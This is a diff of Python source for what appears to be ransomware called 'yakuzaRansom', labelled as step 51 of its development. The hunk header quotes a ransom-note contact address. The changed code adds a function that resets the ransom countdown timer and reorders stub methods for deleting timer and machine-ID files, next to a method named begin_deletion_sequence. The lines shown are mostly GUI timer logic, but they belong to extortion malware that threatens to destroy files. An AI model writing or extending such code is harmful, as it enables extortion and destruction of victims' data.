@@ -1038,10 +1038,20 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
             file.write(str(self.closingTime.timestamp()))
         self.update_timer()
 
-    def delete_timer_and_machine_id_files(self):
+    # Step 51: Function to resting the timer state
+    def reset_timer_state(self):
+        with open(TIMER_STATE_FILE, 'w') as file:
+            file.write("")
+        self.timerLabel.config(text="No Active Countdown.")
+
+
+
+    # Step 51: Function to reset the timer state
+    def delete_timer_state_file(self):
         pass
 
-    def delete_timer_state_file(self):
+
+    def delete_timer_and_machine_id_files(self):
         pass
 
     def begin_deletion_sequence(self):
